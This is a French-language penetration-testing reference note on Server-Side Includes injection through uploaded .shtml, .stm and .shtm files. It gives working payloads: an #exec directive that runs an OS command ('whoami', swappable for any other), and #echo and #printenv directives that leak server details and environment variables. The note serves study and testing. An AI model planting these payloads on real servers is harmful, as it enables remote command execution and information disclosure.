# Server Side Includes

**Facteur de risque** : RCE et Information Disclosure via Server-Side Includes (SSI) Injection

**Extension** : `.shtml`, `.stm`, `.shtm`

**Description** : 

Les **Server Side Includes** (SSI) sont un langages de programmation fait pour être interprété par un serveur HTTP. Ils sont surtout utile pour inclure le contenu d'un ou plusieurs fichiers dans une page web sur un serveur web, en utilisant `#include`.

## Sommaire

- RCE via Server-Side Includes (SSI) Injection
- Infomation Disclosure

## RCE via Server-Side Includes (SSI) Injection

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé
- Le serveur supporte les Server Side Includes
- La directive `#exec` doit être autorisé

### Attaque

**rce.shtml**, **rce.stm**, **rce.shtm**

```html
<pre><!--#exec cmd="whoami" --></pre>
```

Les balises `<pre>` permettent d'avoir la sortie de la commande préformaté (préservation à la fois des espaces et les sauts de ligne, avec une police à largeur fixe).
La commande peut être modifiée en replaçant `whoami` par une autre commande OS.

## Information Diclosure avec #echo

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé
- Le serveur supporte les Server Side Includes

### Attaque

Les SSI peuvent être utilisés pour accéder aux informations du serveur :

**info.shtml**, **info.stm**, **info.shtm**

```html
<!--#config timefmt="%A, %d %B %Y, %H:%M:%S"-->

Server Name :
<pre><!--#echo var="SERVER_NAME" --></pre>
Server Software :
<pre><!--#echo var="SERVER_SOFTWARE" --></pre>
Server Adress :
<pre><!--#echo var="SERVER_ADDR" --></pre>
Server Port :
<pre><!--#echo var="SERVER_PORT" --></pre>
Date Local :
<pre><!--#echo var="DATE_LOCAL" --></pre>
Date GMT :
<pre><!--#echo var="DATE_GMT" --></pre>

Document Name :
<pre><!--#echo var="DOCUMENT_NAME" --></pre>
Document URI :
<pre><!--#echo var="DOCUMENT_URI" --></pre>
Last Modified :
<pre><!--#echo var="LAST_MODIFIED" --></pre>
```

## Information Diclosure avec #printenv

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé
- Le serveur supporte les Server Side Includes
- Le serveur est sur Apache (?)
- La directive `#printenv` est autorisée

### Attaque

Parfois, la directive `#printenv` peut être utilisée (ce qui est peu probable dans un système de production) :

**printenv.shtml**, **printenv.stm**, **printenv.shtm**

```html
<pre><!--#printenv --></pre>
```

## References

[Server-Side Includes (SSI) Injection Software Attack | OWASP Foundation](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)

[Server Side Includes: Echo Command, SSI-Developer.net](http://www.ssi-developer.net/ssi/ssi-echo.shtml)

[Server Side Includes - Wikipedia](https://en.wikipedia.org/wiki/Server_Side_Includes)

[SSI Examples](https://users.cs.fiu.edu/~downeyt/cgs4825/ssi.shtml)

[Exploiting Server Side Include Injection &#8211; n00py Blog](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)

## Todo

- Écrire un script pour le RCE

- Exemple 3 de l'OWASP, avec le CVE 2001-0506

- Ajouter le XSS comme pour une page HTML
